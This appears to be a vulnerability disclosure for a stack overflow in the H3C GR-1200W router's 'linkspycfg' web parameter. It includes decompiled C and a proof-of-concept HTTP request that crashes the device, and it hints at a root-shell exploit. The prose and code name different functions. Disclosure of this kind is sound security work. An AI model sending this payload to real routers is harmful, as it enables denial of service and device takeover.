### Affected product

```
H3C GR-1200W  MiniGRW1A0V100R006
```

### Firmware

```
https://www.h3c.com/cn/d_202102/1383837_30005_0.htm
```
In function sub_4ACC30,the content obtained by the program from the parameter "linkspycfg" is passed to sa .Then the sa is directly copied into the v9 stack through the strncpy function.
There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code 
Execution with carefully crafted overflow data.

### Detail

```c
int __fastcall sub_40CD88(int a1)
{
  size_t v2; // [sp+30h] [+30h]
  size_t v3; // [sp+30h] [+30h]
  char *v4; // [sp+34h] [+34h]
  char *v5; // [sp+38h] [+38h]
  char *sa; // [sp+3Ch] [+3Ch]
  char *s; // [sp+3Ch] [+3Ch]
  int v8; // [sp+40h] [+40h] BYREF
  char v9[256]; // [sp+44h] [+44h] BYREF
  int v10[8]; // [sp+144h] [+144h] BYREF
  int v11; // [sp+164h] [+164h] BYREF
  int v12; // [sp+168h] [+168h] BYREF
  int v13; // [sp+16Ch] [+16Ch] BYREF
  int v14; // [sp+170h] [+170h] BYREF
  int v15; // [sp+174h] [+174h] BYREF
  int v16; // [sp+178h] [+178h] BYREF
  char v17[32]; // [sp+17Ch] [+17Ch] BYREF
  char v18[32]; // [sp+19Ch] [+19Ch] BYREF
  char v19[36]; // [sp+1BCh] [+1BCh] BYREF

  v10[0] = 0;
  v10[1] = 0;
  v10[2] = 0;
  v10[3] = 0;
  v10[4] = 0;
  v10[5] = 0;
  v10[6] = 0;
  v10[7] = 0;
  sa = (char *)sub_4E58C8(a1, "linkspycfg", &unk_4EE560);
  v2 = strlen(sa);
  memset(v9, 0, sizeof(v9));
  strncpy(v9, sa, v2);
  sscanf(v9, "%d %d %d;", &v11, &v12, &v13);
  CFG_SetEnableValue(0, 738463744, v11);
  CFG_SetInt32Value(0, 738467840, v12);
  CFG_SetInt32Value(0, 738471936, v13);
  s = (char *)sub_4E58C8(a1, "param", &unk_4EE560);
  v3 = strlen(s);
  v4 = s;
  v5 = strchr(s, 59);
  while ( v5 )
  {
    memset(v9, 0, sizeof(v9));
    strncpy(v9, v4, v5 - v4);
    sscanf(v9, "%s %d %s %d %s %d %s", v10, &v14, v17, &v15, v18, &v16, v19);
    if ( !IF_GetByPseudoNameDomain(v10, 0, &v8) )
    {
      CFG_SetEnableValue(v8, 738476032, v14);
      CFG_Set(v8, 738488320, v17);
      CFG_SetEnableValue(v8, 738480128, v15);
      CFG_Set(v8, 738492416, v18);
      CFG_SetEnableValue(v8, 738484224, v16);
      CFG_Set(v8, 738496512, v19);
      v4 = v5 + 1;
      if ( v5 + 1 >= &s[v3] )
        return 0;
      v5 = strchr(v4, 59);
    }
  }
  return 0;
}
```
### POC

```python
POST /goform/aspForm HTTP/1.1
Host: 192.168.0.11:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://121.226.152.63:8443/router_password_mobile.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 553
Origin: https://192.168.0.124:80
DNT: 1
Connection: close
Cookie: JSESSIONID=5c31d502
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

CMD=UpdateWanLinkspyMulti&linkspycfg=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,;

```




You can see the router crash, and finally we can write an exp to get a root shell
